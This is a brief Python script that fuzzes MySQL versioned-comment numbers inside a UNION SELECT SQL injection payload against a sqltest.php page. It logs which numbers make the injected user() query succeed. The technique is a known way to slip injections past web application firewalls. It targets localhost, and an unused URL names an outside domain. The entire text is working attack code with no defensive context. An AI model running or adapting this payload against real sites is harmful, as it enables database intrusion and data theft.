import requests
url = r'http://lrzdjx.com/sqltest.php?x=1/*!{}*/'

for i in range(10000,99999):
    payload = r'http://127.0.0.1/sqltest.php?x=1 union select (/*!{}user()*/),2,3'.format(i)
    ret = requests.get(payload).text
    print(i)
    if 'root@localhost' in ret:
        print('[OK!]')
        with open('ret2.txt', 'at') as f:
            f.writelines(str(i)+'\n')
